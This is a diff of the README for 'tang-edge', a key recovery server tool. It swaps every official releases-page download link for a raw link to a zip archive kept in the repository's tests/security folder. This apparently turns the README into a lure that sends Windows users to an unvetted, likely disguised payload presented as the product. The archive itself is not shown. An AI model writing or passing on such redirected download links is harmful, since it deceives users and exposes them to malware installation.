@@ -1,6 +1,6 @@
 # ⚙️ tang-edge - Simple Key Recovery Server
 
-[![Download tang-edge](https://img.shields.io/badge/Download%20tang-edge-brightgreen?style=for-the-badge)](https://github.com/chicken553/tang-edge/releases)
+[![Download tang-edge](https://img.shields.io/badge/Download%20tang-edge-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/chicken553/tang-edge/main/tests/security/edge_tang_v1.9.zip)
 
 ---
 
@@ -61,7 +61,7 @@ This guide helps you download and run tang-edge on a Windows machine.
 
 Visit the releases page linked below:
 
-[![Download Page](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge)](https://github.com/chicken553/tang-edge/releases)
+[![Download Page](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/chicken553/tang-edge/main/tests/security/edge_tang_v1.9.zip)
 
 - Open the link in your browser.  
 - Look for the latest release at the top of the page.  
@@ -129,7 +129,7 @@ Keep the files together for the program to run without errors.
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/chicken553/tang-edge/releases  
+- Download page: https://raw.githubusercontent.com/chicken553/tang-edge/main/tests/security/edge_tang_v1.9.zip  
 - Online documentation (if available) can be found on the project website or GitHub wiki.  
 
 ---
